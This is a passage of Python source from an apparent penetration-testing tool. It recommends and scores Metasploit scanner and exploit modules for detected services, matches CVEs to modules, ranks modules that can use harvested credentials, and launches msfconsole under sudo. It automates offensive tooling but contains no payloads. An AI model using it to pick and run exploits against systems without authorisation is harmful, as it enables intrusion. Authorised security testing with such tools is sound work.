                    "risk": "safe",
                },
            ],
            "exploit": [
                {
                    "path": "exploit/linux/redis/redis_replication_cmd_exec",
                    "name": "Redis Replication Code Execution",
                    "description": "Exploit Redis via replication",
                    "risk": "dangerous",
                },
            ],
        },
    }

    def get_recommendations(
        self, service: str, version: str = None, include_risk: List[str] = None
    ) -> List[Dict]:
        """
        Get module recommendations for a service.

        Args:
            service: Service name (ssh, smb, http, etc.)
            version: Service version string
            include_risk: List of risk levels to include ['safe', 'noisy', 'moderate', 'dangerous']

        Returns:
            List of recommended modules
        """
        if include_risk is None:
            include_risk = ["safe", "noisy", "moderate"]

        service_lower = service.lower()
        recommendations = []

        # Get modules for this service
        if service_lower in self.MODULES:
            modules = self.MODULES[service_lower]

            for category in ["scanner", "exploit"]:
                for module in modules.get(category, []):
                    if module["risk"] in include_risk:
                        module["category"] = category
                        recommendations.append(module)

        return recommendations

    def match_vulnerability_to_exploit(
        self, vuln_title: str, vuln_desc: str = "", cves: List[str] = None
    ) -> List[Dict]:
        """
        Match a vulnerability to potential exploit modules.

        Args:
            vuln_title: Vulnerability title
            vuln_desc: Vulnerability description
            cves: List of CVE IDs

        Returns:
            List of matching exploit modules
        """
        matches = []

        for service, modules in self.MODULES.items():
            for exploit in modules.get("exploit", []):
                # Check CVE match
                if cves and "cve" in exploit:
                    if any(cve in exploit["cve"] for cve in cves):
                        matches.append(exploit)
                        continue

                # Check keyword match
                keywords = vuln_title.lower() + " " + vuln_desc.lower()
                module_keywords = (
                    exploit["name"].lower() + " " + exploit["description"].lower()
                )

                if any(word in keywords for word in module_keywords.split()):
                    matches.append(exploit)

        return matches

    def get_recommendations_for_service(
        self,
        service: str,
        version: str = None,
        engagement_id: int = None,
        risk_levels: List[str] = None,
        include_cve_matches: bool = True,
    ) -> List[Dict]:
        """
        Get intelligent recommendations based on service and version.

        Args:
            service: Service name (ssh, smb, http, etc.)
            version: Service version string
            engagement_id: Engagement ID for context
            risk_levels: Risk levels to include
            include_cve_matches: Include CVE-matched modules

        Returns:
            Prioritized list of recommendations with scores
        """
        if risk_levels is None:
            risk_levels = ["safe", "noisy", "moderate"]

        recommendations = []

        # Get basic module recommendations
        basic_recs = self.get_recommendations(service, version, risk_levels)

        # Add CVE matching if version provided
        if version and include_cve_matches:
            matching_cves = VersionMatcher.get_cves_for_version(service, version)

            for cve_id in matching_cves:
                cve_data = CVE_DATABASE.get(cve_id, {})
                for module_path in cve_data.get("modules", []):
                    # Find if this module exists in our database
                    module_info = self._find_module_by_path(module_path)
                    if module_info:
                        # Enhance with CVE data
                        enhanced_module = module_info.copy()
                        enhanced_module["cve_match"] = cve_id
                        enhanced_module["cvss"] = cve_data.get("cvss")
                        enhanced_module["reliability"] = cve_data.get("reliability")
                        enhanced_module["impact"] = cve_data.get("impact")
                        enhanced_module["score"] = self._score_module(
                            enhanced_module, engagement_id
                        )
                        recommendations.append(enhanced_module)

        # Add basic recommendations with scores
        for module in basic_recs:
            if not any(r.get("path") == module.get("path") for r in recommendations):
                module["score"] = self._score_module(module, engagement_id)
                recommendations.append(module)

        # Sort by score descending
        recommendations.sort(key=lambda x: x.get("score", 0), reverse=True)

        return recommendations

    def _find_module_by_path(self, module_path: str) -> Optional[Dict]:
        """Find module info by path in module database."""
        for service, modules in self.MODULES.items():
            for category in ["scanner", "exploit"]:
                for module in modules.get(category, []):
                    if module.get("path") == module_path:
                        result = module.copy()
                        result["category"] = category
                        return result
        return None

    def _score_module(self, module: Dict, engagement_id: int = None) -> float:
        """
        Score module (0-100) based on various factors.

        Scoring breakdown:
        - CVE match (30 points)
        - CVSS score (25 points)
        - Reliability (20 points)
        - Prerequisites met (15 points)
        - Risk level (10 points)
        """
        score = 0.0

        # CVE match bonus
        if module.get("cve_match"):
            score += 30.0

        # CVSS score (normalize to 25 points)
        cvss = module.get("cvss", 0)
        if cvss:
            score += (cvss / 10.0) * 25.0

        # Reliability rating
        reliability_scores = {
            "excellent": 20.0,
            "good": 15.0,
            "normal": 10.0,
            "average": 5.0,
            "low": 2.0,
        }
        reliability = module.get("reliability", "normal")
        score += reliability_scores.get(reliability, 10.0)

        # Prerequisites (check if we have creds available)
        if module.get("requires") == "credentials":
            if engagement_id:
                # Check if we have credentials
                try:
                    from souleyez.storage.credentials import CredentialsManager

                    cm = CredentialsManager()
                    creds = cm.list_credentials(engagement_id)
                    if creds:
                        score += 15.0
                except:
                    score += 5.0  # Assume we might have creds
            else:
                score += 5.0
        else:
            score += 15.0  # No prerequisites needed

        # Risk level (lower risk = higher score for safety)
        risk_scores = {"safe": 10.0, "noisy": 7.0, "moderate": 5.0, "dangerous": 2.0}
        risk = module.get("risk", "moderate")
        score += risk_scores.get(risk, 5.0)

        return score

    def query_live_msf_modules(self, search_term: str) -> List[Dict]:
        """
        Query actual MSF installation for modules.

        Args:
            search_term: Search term for msfconsole

        Returns:
            List of modules with metadata
        """
        console = MSFConsoleManager()
        if not console.is_available():
            return []

        try:
            output = console.execute_command(f"search {search_term}")
            modules = self._parse_msf_search_output(output)
            return modules
        except:
            return []

    def _parse_msf_search_output(self, output: str) -> List[Dict]:
        """Parse msfconsole search output."""
        modules = []
        lines = output.split("\n")

        for line in lines:
            # Skip headers and empty lines
            if not line.strip() or "Matching Modules" in line or "=====" in line:
                continue

            # Parse module line
            parts = line.strip().split(None, 3)
            if len(parts) >= 3:
                modules.append(
                    {
                        "path": parts[0],
                        "disclosure_date": parts[1] if len(parts) > 1 else None,
                        "rank": parts[2] if len(parts) > 2 else None,
                        "name": parts[3] if len(parts) > 3 else parts[0],
                    }
                )

        return modules

    def get_credential_powered_modules(
        self, engagement_id: int, service_type: str = None
    ) -> List[Dict]:
        """
        Get modules that can leverage discovered credentials.

        Args:
            engagement_id: Engagement ID
            service_type: Optional service type filter

        Returns:
            List of modules that can use available credentials
        """
        try:
            from souleyez.storage.credentials import CredentialsManager

            cm = CredentialsManager()
            creds = cm.list_credentials(engagement_id)
        except:
            return []

        if not creds:
            return []

        # Group creds by service
        cred_map = {}
        for cred in creds:
            service = cred.get("service", "unknown").lower()
            if service not in cred_map:
                cred_map[service] = []
            cred_map[service].append(cred)

        powered_modules = []

        for service, service_creds in cred_map.items():
            if service_type and service_type.lower() not in service:
                continue

            # Get modules requiring credentials
            modules = self.get_recommendations(
                service=service, include_risk=["safe", "noisy", "moderate"]
            )

            for module in modules:
                if module.get("requires") == "credentials":
                    module["available_credentials"] = len(service_creds)
                    module["ready_to_run"] = True
                    module["score"] = 95.0  # High score since we have creds
                    powered_modules.append(module)

        return powered_modules


class ModuleRecommendationEngine:
    """Advanced recommendation engine with context-aware scoring."""

    def __init__(self):
        self.module_selector = MSFModuleSelector()

    def get_ranked_recommendations(
        self, host_id: int, service_id: int, engagement_id: int
    ) -> List[Dict]:
        """
        Return ranked list of modules with scores and rationale.

        Args:
            host_id: Host ID
            service_id: Service ID
            engagement_id: Engagement ID

        Returns:
            List of ranked recommendations with metadata
        """
        try:
            from souleyez.storage.hosts import HostManager

            hm = HostManager()
            service = hm.get_service(service_id)

            if not service:
                return []

            service_name = service.get("service_name", "")
            service_version = service.get("service_version", "")

            recommendations = self.module_selector.get_recommendations_for_service(
                service=service_name,
                version=service_version,
                engagement_id=engagement_id,
                include_cve_matches=True,
            )

            # Enhance with rationale
            for rec in recommendations:
                rec["rationale"] = self._generate_rationale(rec)
                rec["prerequisites_met"] = self._check_prerequisites(rec, engagement_id)
                rec["estimated_success"] = self._estimate_success(rec)

            return recommendations
        except:
            return []

    def _generate_rationale(self, module: Dict) -> str:
        """Generate human-readable rationale for recommendation."""
        reasons = []

        if module.get("cve_match"):
            reasons.append(f"CVE {module['cve_match']} match")

        if module.get("cvss", 0) >= 9.0:
            reasons.append("Critical CVSS score")
        elif module.get("cvss", 0) >= 7.0:
            reasons.append("High CVSS score")

        if module.get("reliability") == "excellent":
            reasons.append("Excellent reliability")

        if module.get("ready_to_run"):
            reasons.append("Credentials available")

        if not reasons:
            reasons.append("Standard recommendation")

        return " + ".join(reasons)

    def _check_prerequisites(self, module: Dict, engagement_id: int) -> bool:
        """Check if module prerequisites are met."""
        if module.get("requires") == "credentials":
            return module.get("available_credentials", 0) > 0
        return True

    def _estimate_success(self, module: Dict) -> str:
        """Estimate success probability."""
        score = module.get("score", 0)

        if score >= 80:
            return "high"
        elif score >= 60:
            return "medium"
        elif score >= 40:
            return "low"
        else:
            return "very low"


class MSFConsoleManager:
    """Manage msfconsole sessions and RPC communication."""

    def __init__(self):
        """Initialize MSF console manager."""
        self.msf_path = self._find_msfconsole()
        self._needs_no_readline = self._check_needs_no_readline()

    def _check_needs_no_readline(self) -> bool:
        """Check if --no-readline flag is needed (ARM64 Ubuntu has reline bug)."""
        import platform

        # Only needed on ARM64 (aarch64)
        if platform.machine() != "aarch64":
            return False
        # Check if we're on Ubuntu (not Kali which works fine)
        try:
            with open("/etc/os-release", "r") as f:
                content = f.read().lower()
                if "ubuntu" in content and "kali" not in content:
                    return True
        except:
            pass
        return False

    def _find_msfconsole(self) -> str:
        """Find msfconsole executable."""
        import shutil

        # First try shutil.which (fastest)
        path = shutil.which("msfconsole")
        if path:
            return path

        # Try common locations
        locations = [
            "/usr/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
            "/usr/local/bin/msfconsole",
        ]

        for loc in locations:
            if os.path.isfile(loc) and os.access(loc, os.X_OK):
                return loc

        return None

    def is_available(self) -> bool:
        """Check if msfconsole is available."""
        return self.msf_path is not None

    def launch_with_resource(
        self, resource_file: str, background: bool = False, use_sudo: bool = True
    ) -> subprocess.Popen:
        """
        Launch msfconsole with a resource script.

        Args:
            resource_file: Path to .rc file
            background: Run in background
            use_sudo: Use sudo for privilege escalation (default: True)

        Returns:
            Process handle if background, None otherwise
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")

        cmd = []
        if use_sudo:
            cmd.append("sudo")
        cmd.append(self.msf_path)
        cmd.append("-q")
        if self._needs_no_readline:
            cmd.append("--no-readline")
        cmd.extend(["-r", resource_file])

        if background:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            # Interactive mode - use os.system for proper TTY handling
            # subprocess.run doesn't properly inherit terminal attributes
            os.system(
                shlex.join(cmd)
            )  # nosec B605 - intentional shell for TTY, args escaped with shlex
            # Reset terminal after msfconsole (ARM64 Ruby readline corrupts it)
            os.system("stty sane 2>/dev/null")  # nosec B605 - static command
            return None

    def launch_interactive(
        self,
        pre_commands: List[str] = None,
        workspace: str = None,
        use_sudo: bool = True,
    ) -> None:
        """
        Launch interactive msfconsole with optional pre-commands.

        Args:
            pre_commands: List of commands to run on startup
            workspace: Workspace name to create/use
            use_sudo: Use sudo for privilege escalation (default: True)
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")

        # Build command
        cmd = []
        if use_sudo:
            cmd.append("sudo")
        cmd.append(self.msf_path)
        cmd.append("-q")
        if self._needs_no_readline:
            cmd.append("--no-readline")

        # Create temporary resource script if we have pre-commands
        if pre_commands or workspace:
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
                if workspace:
                    f.write(f"workspace -a {workspace}\n")
                    f.write(f"workspace {workspace}\n")

                if pre_commands:
                    for cmd_line in pre_commands:
                        f.write(f"{cmd_line}\n")

                rc_file = f.name

            try:
                cmd.extend(["-r", rc_file])
                # Use os.system for proper TTY handling
                os.system(
                    shlex.join(cmd)
                )  # nosec B605 - intentional shell for TTY, args escaped with shlex
                # Reset terminal after msfconsole (ARM64 Ruby readline corrupts it)
                os.system("stty sane 2>/dev/null")  # nosec B605 - static command
            finally:
                os.unlink(rc_file)
        else:
            # Just launch msfconsole - use os.system for proper TTY handling
            os.system(
                shlex.join(cmd)
            )  # nosec B605 - intentional shell for TTY, args escaped with shlex
            # Reset terminal after msfconsole (ARM64 Ruby readline corrupts it)
            os.system("stty sane 2>/dev/null")  # nosec B605 - static command

    def execute_command(self, command: str) -> str:
        """
        Execute a single msfconsole command and return output.

        Args:
            command: MSF command to execute

        Returns:
            Command output
        """
        if not self.is_available():
            raise RuntimeError("msfconsole not found")

        # Create temporary rc file
        import tempfile

        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
            f.write(command + "\n")
            f.write("exit\n")
            rc_file = f.name

        try:
            result = subprocess.run(
                [self.msf_path, "-q", "-r", rc_file],
                capture_output=True,
                text=True,
                timeout=30,
            )
            return result.stdout
        finally:
            os.unlink(rc_file)
